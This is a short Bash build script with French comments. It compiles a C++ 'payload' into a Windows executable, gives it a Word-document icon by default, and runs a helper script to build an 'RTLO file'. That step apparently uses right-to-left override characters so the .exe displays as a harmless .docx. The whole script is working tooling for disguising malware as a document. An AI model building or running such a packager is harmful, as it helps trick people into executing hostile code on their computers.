#!/usr/bin/env bash
set -euo pipefail

show_help() {
  cat <<EOF
Usage: $(basename "$0") [filename] [filename_noext] [executable_cpp]

Paramètres (positional, optionnels) :
  filename         Nom du fichier .ico (par défaut: docx.ico)
  filename_noext   Nom sans extension (utilisé pour nommer l'exécutable, par défaut: docx)
  executable_cpp   Fichier source .cpp à compiler (par défaut: build.cpp)

Exemples :
  ./build.sh
    -> utilise par défaut docx.ico, docx, build.cpp

  ./build.sh myicon.ico myprog main.cpp
    -> utilise myicon.ico, myprog, main.cpp

Options :
  -h, --help       Affiche cette aide.

EOF
}

# Detect si aide
if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  show_help
  exit 0
fi

filename="${1:-docx.ico}"
filename_noext="${2:-docx}"
executable_cpp="${3:-build.cpp}"

error_exit() {
  echo "Erreur: $*" >&2
  exit 1
}

check_command() {
  local cmd="$1"
  if ! command -v "$cmd" >/dev/null 2>&1; then
    error_exit "La commande '$cmd' est introuvable. Installez la toolchain (ex: sudo pacman -S mingw-w64-gcc (Arch/Manjaro) ou sudo apt install gcc-mingw-w64 (Ubuntu/Debian)) et assurez-vous que '$cmd' est dans le PATH."
  fi
}

check_command x86_64-w64-mingw32-windres
check_command x86_64-w64-mingw32-g++

if [[ ! -f "$filename" ]]; then
  error_exit "Fichier d'icône introuvable : '$filename'"
fi

if [[ ! -f "$executable_cpp" ]]; then
  error_exit "Fichier source C++ introuvable : '$executable_cpp'"
fi

echo "Paramètres :"
echo "  icône (filename)       		 = $filename"
echo "  nom sans extension     		 = $filename_noext"
echo "  fichier source .cpp (payload)    = $executable_cpp"
echo

echo "[+] Génération des fichiers de ressources"
rcfile="resources.rc"
resfile="resources.res"
exe_name="build.exe"

echo "[+] Création de $rcfile..."
printf 'IDI_MYICON ICON "%s"\n' "$filename" > "$rcfile"

echo "[+] Compilation des ressources -> $resfile ..."
x86_64-w64-mingw32-windres "$rcfile" -O coff -o "$resfile"

echo "[+] Compilation de l'exécutable -> $exe_name ..."
x86_64-w64-mingw32-g++ -o "$exe_name" "$executable_cpp" "$resfile"

echo "[+] Creating RTLO file"
python3 rename_rtlo.py -f $exe_name -O $filename_noext

rm $rcfile
rm $resfile

echo

